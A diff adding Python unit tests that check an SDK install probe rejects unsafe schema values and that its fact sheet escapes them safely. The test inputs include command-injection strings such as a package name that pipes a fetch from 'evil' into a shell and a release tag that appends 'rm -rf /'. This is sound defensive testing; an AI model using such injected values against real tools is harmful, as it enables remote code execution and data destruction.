@@ -37,6 +37,12 @@ SCHEMA: dict[str, Any] = {
 }
 
 
+def _rejected_probe(package_name: str) -> InstallResult:
+    schema = {**SCHEMA, "language": {"nodejs": {"packageName": package_name}}}
+    return next(r for r in sdk_install_probe.probe_installs("time", "v0.1.1", schema)
+                if r.language == "nodejs")
+
+
 class InstallProbeTests(unittest.TestCase):
     def setUp(self) -> None:
         self.calls: list[list[str]] = []
@@ -67,6 +73,47 @@ class InstallProbeTests(unittest.TestCase):
         self.assertEqual(results["plugin"], "rejected")
         self.assertEqual(results["nodejs"], "rejected")
         self.assertFalse(any(c and c[0] in ("npm", "pulumi") for c in self.calls))
+
+    def test_a_rejection_names_the_value_and_what_is_allowed(self) -> None:
+        node = _rejected_probe("foo; curl evil|sh")
+        self.assertIn("foo; curl evil", node.command)
+        self.assertIn("nodejs packageName", node.error)
+        self.assertIn("letters, digits", node.error)
+
+    def test_a_rejection_names_the_schema_key_it_read(self) -> None:
+        schema = {**SCHEMA, "language": {"go": {"importBasePath": "a b"},
+                                         "python": {"packageName": "a b"}}}
+        kinds = {r.language: r.error for r in sdk_install_probe.probe_installs("time", "v0.1.1", schema)}
+        self.assertIn("importBasePath", kinds["go"])
+        self.assertIn("packageName", kinds["python"])
+
+    def test_a_derived_python_name_says_where_it_came_from(self) -> None:
+        schema = {"name": "a b", "language": {"python": {}}}
+        python = next(r for r in sdk_install_probe.probe_installs("time", "v0.1.1", schema)
+                      if r.language == "python")
+        self.assertIn("taken from the schema name", python.error)
+
+    def test_a_pipe_in_the_value_cannot_break_the_table_row(self) -> None:
+        installs = [_rejected_probe("foo|sh")]
+        row = next(line for line in fact_sheet.render(_manifest(installs=installs)).splitlines()
+                   if "nodejs SDK" in line)
+        self.assertEqual(len(re.findall(r"(?<!\\)\|", row)), 4)
+        self.assertIn(r"\|", row)
+
+    def test_a_backtick_in_the_value_cannot_break_the_code_span(self) -> None:
+        rejected = _rejected_probe("foo`sh")
+        self.assertNotIn("`", rejected.command)
+        self.assertEqual(rejected.error.count("`"), 2)
+
+    def test_an_enormous_value_is_bounded(self) -> None:
+        rejected = _rejected_probe("!" * 5000)
+        self.assertLess(len(rejected.command), 200)
+        self.assertLess(len(rejected.error), 600)
+
+    def test_a_rejected_tag_says_it_is_the_tag(self) -> None:
+        rejected = sdk_install_probe.probe_installs("time", "v0.1.1 && rm -rf /", SCHEMA)
+        self.assertEqual([r.result for r in rejected], ["rejected"])
+        self.assertIn("release tag", rejected[0].error)
 
     def test_github_scheme_plugin_url_is_passed_as_server(self) -> None:
         schema = {**SCHEMA, "pluginDownloadURL": "github://api.github.com/o/r"}
@@ -267,6 +314,11 @@ class FactSheetTests(unittest.TestCase):
         out = fact_sheet.render(_manifest(schemaVersion="1.0.0"))
         self.assertIn("schema version", out)
         self.assertNotIn("declares version", out)
+
+    def test_a_rejection_reason_reaches_the_sheet(self) -> None:
+        out = fact_sheet.render(_manifest(installs=[_rejected_probe("a b")]))
+        self.assertIn("**nodejs** 🚫", out)
+        self.assertIn("The schema gives the nodejs packageName as `'a b'`", out)
 
     def test_red_render_with_install_failure(self) -> None:
         out = fact_sheet.render(_manifest(
